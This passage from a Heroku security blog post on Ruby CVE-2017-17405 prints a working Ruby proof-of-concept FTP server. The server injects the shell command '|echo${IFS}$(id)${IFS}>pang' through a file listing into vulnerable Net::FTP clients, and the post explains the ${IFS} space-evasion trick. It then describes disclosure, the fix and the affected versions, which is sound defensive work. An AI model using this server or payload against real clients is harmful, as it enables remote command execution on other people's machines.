<p>The PoC server code is not the best Ruby code you will ever see, but it was good enough to trigger the vulnerability and provide us with RCE. The server needs to simulate the <em>handshake</em> of an FTP connection. This fools the client into thinking it is connecting to a real FTP server and does the bare minimum to get the client to request a list of files.</p>

<pre class=" language-ruby"><code class=" language-ruby"><span class="token keyword">require</span> <span class="token string">'socket'</span>
host <span class="token operator">=</span> <span class="token string">'172.17.0.4'</span>
port <span class="token operator">=</span> <span class="token number">2121</span>
hostsplit <span class="token operator">=</span> host<span class="token punctuation">.</span><span class="token function">tr</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span>

server <span class="token operator">=</span> <span class="token constant">TCPServer</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token class-name">port</span>

loop <span class="token keyword">do</span>
 <span class="token builtin">Thread</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span>server<span class="token punctuation">.</span>accept<span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>client<span class="token operator">|</span>
   client<span class="token punctuation">.</span>puts <span class="token string">"220 Attack FTP\r\n"</span>
   r <span class="token operator">=</span> client<span class="token punctuation">.</span>gets
   puts r
   client<span class="token punctuation">.</span>puts <span class="token string">"331 password please - version check\r\n"</span>
   r <span class="token operator">=</span> client<span class="token punctuation">.</span>gets
   puts r
   client<span class="token punctuation">.</span>puts <span class="token string">"230 User logged in\r\n"</span>
   r <span class="token operator">=</span> client<span class="token punctuation">.</span>gets
   puts r
   client<span class="token punctuation">.</span>puts <span class="token string">"230 more data please!\r\n"</span>
   r <span class="token operator">=</span> client<span class="token punctuation">.</span>gets
   puts r
   client<span class="token punctuation">.</span>puts <span class="token string">"230 more data please!\r\n"</span>
   r <span class="token operator">=</span> client<span class="token punctuation">.</span>gets
   puts r
   wait <span class="token operator">=</span> <span class="token keyword">true</span>
   psv <span class="token operator">=</span> <span class="token builtin">Thread</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token class-name">do</span>
       pserver <span class="token operator">=</span> <span class="token constant">TCPServer</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token class-name">23461</span>
       <span class="token builtin">Thread</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span>pserver<span class="token punctuation">.</span>accept<span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>pclient<span class="token operator">|</span>
           <span class="token keyword">while</span> wait <span class="token keyword">do</span>
           <span class="token keyword">end</span>
           pclient<span class="token punctuation">.</span>puts <span class="token string">"|echo${IFS}$(id)${IFS}&gt;pang\r\n"</span>
           pclient<span class="token punctuation">.</span>close
       <span class="token keyword">end</span>
   <span class="token keyword">end</span>

   sleep <span class="token number">1</span>

   client<span class="token punctuation">.</span>puts <span class="token string">"227 Entering Passive Mode ("</span><span class="token operator">+</span>hostsplit<span class="token operator">+</span><span class="token string">",91,165)\r\n"</span>
   r <span class="token operator">=</span> client<span class="token punctuation">.</span>gets
   puts r

   psv<span class="token punctuation">.</span>join

   client<span class="token punctuation">.</span>puts <span class="token string">"150 Here comes the directory listing.\r\n"</span>
   wait <span class="token operator">=</span> <span class="token keyword">false</span>

   client<span class="token punctuation">.</span>puts <span class="token string">"226 Directory send OK.\r\n"</span>
   r <span class="token operator">=</span> client<span class="token punctuation">.</span>gets
   puts r
   client<span class="token punctuation">.</span>puts <span class="token string">"221 goodbye\r\n"</span>
   client<span class="token punctuation">.</span>close
 <span class="token keyword">end</span>
<span class="token keyword">end</span>
</code></pre>

<p>The actual exploit happens when we supply the <code>filelist</code>, with <code>pclient.puts "|echo${IFS}$(id)${IFS}&gt;pang\r\n"</code>, which will result in <code>echo $(id) &gt; pang</code> being run on the connecting client. If our exploitation is successful, we would see a new file created on the client, containing the output of the <code>id</code> command. Although not strictly necessary, we "encoded" the space using <code>${IFS}</code>, which is a special shell variable called the Internal Field Separator. This is useful in cases where spaces cause issues in your payloads.</p>

<p><img src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/1519397611-rubyCVEscreenshot.png" alt="rubyCVEscreenshot"></p>
<h2 class="anchored">
  <a name="report-and-fix" href="https://blog.heroku.com/identifying-ruby-ftp-cve#report-and-fix">Report and Fix</a>
</h2>

<p>We reported the vulnerability to the Ruby team shortly after discovery. The response was excellent and the bug was fixed within hours.</p>

<p>The Ruby team simply replaced the <code>open</code> function with the <code>File.open</code> function, which is not vulnerable to command injection.</p>

<p>The fix was included in the stable release of Ruby, <a href="https://www.ruby-lang.org/en/news/2017/12/14/ruby-2-4-3-released/">version 2.4.3</a>. We were also assigned <a href="https://www.ruby-lang.org/en/news/2017/12/14/net-ftp-command-injection-cve-2017-17405/">CVE-2017-17405</a>.</p>

<p>The following versions of Ruby are all affected by this vulnerability:</p>

<ul>
<li>Ruby 2.2 series: 2.2.8 and earlier</li>
<li>Ruby 2.3 series: 2.3.5 and earlier</li>
<li>Ruby 2.4 series: 2.4.2 and earlier</li>
<li>Ruby 2.5 series: 2.5.0-preview1</li>
<li>prior to trunk revision r61242</li>
</ul>
<h2 class="anchored">
  <a name="conclusion" href="https://blog.heroku.com/identifying-ruby-ftp-cve#conclusion">Conclusion</a>
</h2>

<p>System hygiene (ephemerality, immutability, patching, etc) is the foundation of securable systems. Safe and open communication around vulnerabilities being patched raises awareness of similar weaknesses affecting our entire computing ecosystem. You might think of this as how our immunity to classes of vulnerabilities evolve, protecting our infrastructure.</p>

<p>At Heroku we closely monitor security research and vulnerability disclosure. Our belief and investment in the safe discussion around vulnerabilities works to ensure our software stack is kept up to date and our customers are protected. </p>

<p>Patch management forms an integral part of the security life-cycle and cannot be a static process of simply applying patches. Reviewing and understanding the underlying causes of vulnerabilities being patched can help identify further vulnerabilities in the affected software, or even completely different software packages. We closely monitor security research and vulnerability disclosure to ensure our software stack is kept up to date and our customers are protected. </p>

    </section>

    <div class="post-tags">
      <a class="tag" href="https://blog.heroku.com/tags/security">security</a> <a class="tag" href="https://blog.heroku.com/tags/vulnerability">vulnerability</a> <a class="tag" href="https://blog.heroku.com/tags/cve">cve</a> <a class="tag" href="https://blog.heroku.com/tags/ruby">ruby</a>
    </div>

  </article>

  <aside class="post-addendum">
    <section class="share">
      <ul>
  <li class="twitter"><a target="_blank" data-trackable="{&quot;social&quot;:&quot;Twitter&quot;}" href="http://twitter.com/intent/tweet?text=A+Dive+into+Ruby+CVE-2017-17405%3A+Identifying+a+Vulnerability+in+Ruby%E2%80%99s+FTP+Im...&amp;url=https%3A%2F%2Fblog.heroku.com%2Fidentifying-ruby-ftp-cve&amp;via=heroku">Tweet</a></li>
  <li class="facebook"><a target="_blank" data-trackable="{&quot;social&quot;:&quot;Facebook&quot;}" href="http://www.facebook.com/share.php?u=https%3A%2F%2Fblog.heroku.com%2Fidentifying-ruby-ftp-cve">Share</a></li>
  <li class="linkedin"><a target="_blank" data-trackable="{&quot;social&quot;:&quot;LinkedIn&quot;}" href="http://www.linkedin.com/shareArticle?mini=true&amp;source=Heroku&amp;summary=At+Heroku+we+consistently+monitor+vulnerability+feeds+for+new+issues.+Once+something+drops%2C+we+jump+into+action+to+triage+and+determine+how+our+platform...&amp;title=A+Dive+into+Ruby+CVE-2017-17405%3A+Identifying+a+Vulnerability+in+Ruby%E2%80%99s+FTP+Im...&amp;url=https%3A%2F%2Fblog.heroku.com%2Fidentifying-ruby-ftp-cve">Share</a></li>
</ul>

    </section>

      <div class="related-posts">
        <h6 class="caps text-light text-center">
          <span>Related posts</span>
          <hr>
        </h6>
        <ul>
            <li><a href="https://blog.heroku.com/rails-asset-pipeline-vulnerability">Rails Asset Pipeline Directory Traversal Vulnerability (CVE-2018-3760)</a></li>
            <li><a href="https://blog.heroku.com/cache-invalidation-rails-5-2-dalli-store">Cache Invalidation Complexity: Rails 5.2 and Dalli Cache Store</a></li>
            <li><a href="https://blog.heroku.com/private-spaces-vpn">VPN Support for Heroku Private Spaces</a></li>
            <li><a href="https://blog.heroku.com/private-spaces-internal-routing">Internal Routing for Private Space Apps</a></li>
            <li><a href="https://blog.heroku.com/applying-seccomp-filters-on-go-binaries">Applying Seccomp Filters at Runtime for Go Binaries</a></li>
        </ul>
      </div>
  </aside>

    <section class="post-author">
      <h6 class="caps text-light text-center">More from the author</h6>
      <div class="author-card" itemprop="author">
  <div class="author-meta">
    <a href="https://blog.heroku.com/authors/etienne-stalmans">
      <img width="100" height="100" alt="Etienne Stalmans" class="avatar" data-hires="https://gravatar.com/avatar/3776ed0d8600065f0f66e89c3b811a16?d=https%3A%2F%2Fblog-assets3.herokucdn.com%2Fassets%2Favatar-default-guest-ed7ff852c822436eccaf1dee3f291243975027aaf2752dcff8fbedd428ee5b9f.png&amp;s=200" src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/3776ed0d8600065f0f66e89c3b811a16.jpeg">
</a>    <div class="bio">
      <h5 itemprop="name" class="author-name"><a href="https://blog.heroku.com/authors/etienne-stalmans">Etienne Stalmans</a></h5>
      <div class="author-role">
          <span class="badge herokai caps">Heroku Staff</span>
      </div>
    </div>
  </div>

  <hr>

  <ul>
      <li><a href="https://blog.heroku.com/exploration-of-security-when-building-docker-containers">A House of Cards: An Exploration of Security When Building Docker Containers</a></li>
  </ul>

</div>

    </section>

  


        <div id="feeds">
  <p>
    Browse the archives for
    <a href="https://blog.heroku.com/engineering/archives">engineering</a>
    or
    <a href="https://blog.heroku.com/archives">all blogs</a>
    <span class="bullet"></span>
    Subscribe to the RSS feed for
    <a href="https://blog.heroku.com/engineering/feed">engineering</a>
    or
    <a href="https://blog.heroku.com/feed">all blogs</a>.
  </p>
</div>

    </div>

  </div>

  <footer id="heroku-footer">
  <div class="wrapper">
    <div class="col heroku-footer-links">
      <nav class="col">
        <h4>Products</h4>
        <ul>
          <li><a href="https://www.heroku.com/platform">Heroku Platform</a></li>
          <li><a href="https://www.heroku.com/postgres">Heroku Postgres</a></li>
          <li><a href="https://www.heroku.com/redis">Heroku Redis</a></li>
          <li><a href="https://www.heroku.com/kafka">Kafka on Heroku</a></li>
          <li><a href="https://www.heroku.com/enterprise">Heroku Enterprise</a></li>
          <li><a href="https://www.heroku.com/private-spaces">Heroku Private Spaces</a></li>
          <li><a href="https://www.heroku.com/connect">Heroku Connect</a></li>
          <li><a href="https://www.heroku.com/shield">Heroku Shield</a></li>
          <li><a href="https://www.heroku.com/teams">Heroku Teams</a></li>
          <li><a href="https://elements.heroku.com/">Elements Marketplace</a></li>
          <li><a href="https://www.heroku.com/pricing">Pricing</a></li>
        </ul>
      </nav>
      <nav class="col">
        <h4>Resources</h4>
        <ul>
          <li><a href="https://devcenter.heroku.com/">Documentation</a></li>
          <li><a href="https://www.heroku.com/compliance">Compliance Center</a></li>
          <li><a href="https://blog.heroku.com/">Blog</a></li>
          <li><a href="https://www.heroku.com/podcasts">Podcasts</a></li>
          <li><a href="https://devcenter.heroku.com/start">Get Started</a></li>
        </ul>
      </nav>
      <nav class="col">
        <h4>About</h4>
        <ul>
          <li><a href="https://www.heroku.com/about">About Us</a></li>
          <li><a href="https://www.heroku.com/what">What is Heroku</a></li>
          <li><a href="https://www.heroku.com/customers">Our Customers</a></li>
          <li><a href="https://www.heroku.com/careers">Careers</a></li>
          <li><a href="https://www.heroku.com/partnering">Partners</a></li>
          <li><a href="https://www.heroku.com/elements">Elements Marketplace</a></li>
        </ul>
      </nav>
      <nav class="col">
        <h4>Support</h4>
        <ul>
          <li><a href="https://help.heroku.com/">Help Center</a></li>
          <li><a href="https://status.heroku.com/">Status</a></li>
          <li><a href="https://www.heroku.com/critical">Premium Support</a></li>
          <li><a href="https://www.heroku.com/contact">Contact Us</a></li>
        </ul>
      </nav>
    </div>
    <div class="col heroku-footer-social">
      <h3><span class="heroku-footer-icon-newsletter"></span>Subscribe to our monthly newsletter</h3>
      <form id="bookends-newsletter" accept-charset="UTF-8" action="https://www.heroku.com/newsletter_signups" method="post">
        <input name="utf8" type="hidden" value="✓">
        <input type="text" name="website" id="bookends-website" placeholder="do not fill this in" tabindex="-1">
        <input type="email" name="newsletter_signup[email]" id="newsletter_signup_email" placeholder="Your email address" required="required">
        <input type="submit" name="commit" value="Go">
        <p id="bookends-newsletter-result" class="hide"></p>
      </form>
      <ul class="social-list">
        <li class="has-dropdown">
          <a class="heroku-footer-icon-rss" href="https://blog.heroku.com/feed" target="_blank"> RSS</a>
          <div class="dropdown">
            <ul>
              <li><a href="https://blog.heroku.com/feed" target="_blank"><span class="heroku-footer-icon-rss"></span>Heroku Blog</a></li>
              <li><a href="https://blog.heroku.com/news/feed" target="_blank"><span class="heroku-footer-icon-rss"></span>Heroku News Blog</a></li>
              <li><a href="https://blog.heroku.com/engineering/feed" target="_blank"><span class="heroku-footer-icon-rss"></span>Heroku Engineering Blog</a></li>
              <li><a href="http://feeds.feedburner.com/herokudevcenterarticles" target="_blank"><span class="heroku-footer-icon-rss"></span>Dev Center Articles</a></li>
              <li><a href="http://feeds.feedburner.com/herokuchangelog" target="_blank"><span class="heroku-footer-icon-rss"></span>Dev Center Changelog</a></li>
              <li><a href="http://feeds.feedburner.com/herokustatus" target="_blank"><span class="heroku-footer-icon-rss"></span>Heroku Status</a></li>
            </ul>
          </div>
        </li>
        <li class="has-dropdown">
          <a class="heroku-footer-icon-twitter" href="https://twitter.com/heroku" target="_blank"> Twitter</a>
          <div class="dropdown">
            <ul>
              <li><a href="https://twitter.com/heroku" target="_blank"><span class="heroku-footer-icon-twitter"></span>Heroku</a></li>
              <li><a href="https://twitter.com/herokudevcenter" target="_blank"><span class="heroku-footer-icon-twitter"></span>Dev Center Articles</a></li>
              <li><a href="https://twitter.com/herokuchangelog" target="_blank"><span class="heroku-footer-icon-twitter"></span>Dev Center Changelog</a></li>
              <li><a href="https://twitter.com/herokustatus" target="_blank"><span class="heroku-footer-icon-twitter"></span>Heroku Status</a></li>
            </ul>
          </div>
        </li>
        <li><a class="heroku-footer-icon-facebook" href="https://facebook.com/heroku" target="_blank" title="Heroku&#39;s Facebook">Facebook</a></li>
        <li><a class="heroku-footer-icon-instagram" href="https://instagram.com/heroku" target="_blank" title="Heroku&#39;s Instagram">Instagram</a></li>
        <li><a class="heroku-footer-icon-github" href="https://github.com/heroku" target="_blank" title="Heroku&#39;s GitHub">GitHub</a></li>
        <li><a class="heroku-footer-icon-linkedin" href="https://www.linkedin.com/company/heroku" target="_blank" title="Heroku&#39;s LinkedIn">LinkedIn</a></li>
      </ul>
    </div>
  </div>
  <div class="tertiary">
    <div class="wrapper">
      <div class="col">
        <a href="https://www.salesforce.com/" title="salesforce.com" class="sfdc-logo">Heroku is a <span></span> company</a>
      </div>
      <div class="col">
        <ul>
          <li><a href="https://www.heroku.com/home">heroku.com</a></li>
          <li><a href="https://www.heroku.com/policy/salesforce-heroku-msa">Terms of Service</a></li>
          <li><a href="https://www.salesforce.com/company/privacy/">Privacy</a></li>
          <li><a href="https://www.salesforce.com/company/privacy/full_privacy.jsp#nav_info">Cookies</a></li>
          <li class="copyright">
            ©
            2018
            Salesforce.com
          </li>
        </ul>
      </div>
    </div>
  </div>
</footer>







<script type="text/javascript" id="">piAId="37622";piCId="30300";(function(){function a(){var b=document.createElement("script");b.type="text/javascript";b.src=("https:"==document.location.protocol?"https://pi":"http://cdn")+".pardot.com/pd.js";var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(b,a)}window.attachEvent?window.attachEvent("onload",a):window.addEventListener("load",a,!1)})();</script>

<script type="text/javascript" id="">!function(){function f(a){var b=/[?&]?([^=]c)=([^&]*)/;a=b.exec(a)||[];return a=decodeURIComponent(a[2])}function g(a){var b="; "+document.cookie;a=b.split("; "+a+"\x3d");return 2==a.length?a.pop().split(";").shift():void 0}function h(a,b){var c=new Date;c.setTime(c.getTime()+12096E5);c="; expires\x3d"+c.toGMTString();document.cookie=a+"\x3d"+b+c+";domain\x3d.heroku.com;path\x3d/"}var e="campaign",d=g(e);"undefined"==typeof d&&(d=f(document.location.search),"undefined"!==d&&h(e,d))}();</script><script type="text/javascript" id="" src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/js"></script><script type="text/javascript" id="">(function(){var a=function(a){a=new RegExp("[; ]"+a+"\x3d([^\\s;]*)");if(a=(" "+document.cookie).match(a))return unescape(a[1])};if(!a("jbfp")){var b=Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15);document.cookie="jbfp\x3d"+(new Date).getTime()+"-"+b+";domain\x3dheroku.com;path\x3d/;max-age\x3d31536000"}b=document.referrer;var c=a("jbfp"),d=a("heroku_session");a=document.createElement("img");c="https://jambox.heroku.com/e?url\x3d"+escape(document.location.href)+
"\x26fp\x3d"+c+"\x26li\x3d"+d;b&&(c+="\x26ref\x3d"+escape(b));a.src=c})();</script><img src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/0" height="0" width="0" style="display:none; visibility: hidden;"><img height="1" width="1" style="display:none;" alt="" src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/adsct">
<img height="1" width="1" style="display:none;" alt="" src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/adsct(1)"><img height="1" width="1" style="display:none" src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/tr"><script type="text/javascript" id="">$(".heroku-footer-social a").each(function(b,c){if(-1!=this.href.toLowerCase().indexOf("heroku.com/home")){var a=this.textContent.toLowerCase().indexOf("english")?"Japanese Site":"English Site";this.setAttribute("onclick","dataLayer.push({'event': 'trackEvent', 'eventCat': 'Internal Links', 'eventAction': 'Change Language', 'eventLabel': 'Switch to "+a+"', 'eventValue': 0, 'eventInteraction': 0})")}});</script><iframe src="./A Dive into Ruby CVE-2017-17405_ Identifying a Vulnerability in Ruby’s FTP Implementation _ Heroku_files/iframe.html" id="mm_sync_back_ground" style="visibility: hidden; display: none;"></iframe><div id="mid-container" style="position: absolute; top: -1000px; left: -1000px;"><canvas width="100" height="100"></canvas></div></body></html>